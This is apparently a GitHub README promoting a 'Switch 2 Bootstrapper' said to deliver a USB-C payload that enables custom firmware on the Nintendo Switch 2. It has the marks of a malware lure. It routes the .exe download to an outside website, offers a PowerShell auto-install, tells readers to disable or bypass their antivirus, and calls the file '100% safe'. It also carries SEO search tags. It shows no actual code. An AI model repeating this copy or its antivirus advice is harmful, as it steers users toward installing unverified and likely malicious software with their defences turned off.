# Switch 2 Bootstrapper ⚡
[![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)](../../releases)
[![Platform](https://img.shields.io/badge/platform-Windows%2011-lightgrey.svg)](#)
[![Loader](https://img.shields.io/badge/payload-USB--C-brightgreen.svg)](#)

**The official USB-C bootstrap utility for Nintendo Switch 2 custom firmware activation.**

As Nintendo's new security model on the Switch 2 requires a one-time payload delivery via USB-C before the console will accept custom firmware, our tool handles this process automatically. No manual hex editing, no command-line scripts — just plug and play.

---

### ⬇️ DOWNLOAD

<div align="center">
  <a href="../../releases/latest">
    <img src="https://img.shields.io/badge/Go_to_Releases_to_Download-8957e5?style=for-the-badge&logo=github&logoColor=white" alt="Download Switch 2 Bootstrapper" height="50">
  </a>
  <br>
  <i>Please visit the <a href="../../releases/latest">Releases page</a> to download the latest version.</i>
</div>

---

## ✨ Features
- **One-Click Activation:** Connect your Switch 2 via USB-C and click "Activate".
- **Automatic Payload Delivery:** Bypasses signature checks securely.
- **NAND Backup:** Automatically creates a backup of your current NAND before writing.
- **Universal Compatibility:** Works on all current Switch 2 firmware versions.
- **Safe & Stable:** No system files are permanently modified.

## 🛠️ How to use
1. Go to the **[Releases page](../../releases/latest)**.
2. Click the **Download** button in the latest release description. (This will redirect you to our official website, as GitHub flags `.exe` files).
3. Choose between Manual Download or Automatic Install (PowerShell).
4. Connect your Nintendo Switch 2 to your PC using a USB-C data cable.
5. Launch the bootstrapper and follow the on-screen steps.

## ❓ FAQ

**Why do I have to go to your website to download?**
GitHub's automated scanners frequently flag and remove homebrew executables (`.exe` files) due to false positives. We host our installers on our own secure CDN to ensure the file is always available for the community without interruptions.

**My antivirus flags the installer. Is it safe?**
Yes, it is 100% safe. Because this tool interacts with the Switch 2's bootloader and bypasses security checks, Windows Defender and other antiviruses will flag it as a "false positive". You may need to add it to your exclusions or temporarily disable your AV during installation.

**Why is the source code provided but not the .exe?**
We provide the source code here for transparency and review. However, the compiled `.exe` is only available on our website due to GitHub's file size limits and scanner restrictions.

## ⚠️ Disclaimer
This tool is for educational and firmware research purposes only. Use at your own risk. The developers are not responsible for bricked consoles or Nintendo account bans.

---
### 🔎 Search Tags (Indexing)
Nintendo Switch 2 CFW, Switch 2 custom firmware, how to install Switch 2 CFW, Switch2 Bootstrapper tool, free Switch 2 mods, USB-C payload injector, Nintendo homebrew development.
